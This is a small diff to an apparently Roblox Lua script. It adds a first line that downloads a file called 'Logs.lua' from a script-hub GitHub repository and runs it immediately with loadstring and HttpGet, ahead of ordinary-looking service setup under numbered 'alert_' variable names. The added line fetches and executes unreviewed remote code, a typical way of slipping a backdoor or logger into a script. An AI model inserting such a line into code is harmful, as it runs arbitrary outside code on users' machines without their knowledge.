@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/evelynnscripts/Evelynn-Hub-V9/refs/heads/main/Helpers/Logs.lua",true))()
 local alert_37482 = game:GetService("TweenService")
 local alert_59231 = game:GetService("Players")
 local alert_10847 = alert_59231.LocalPlayer
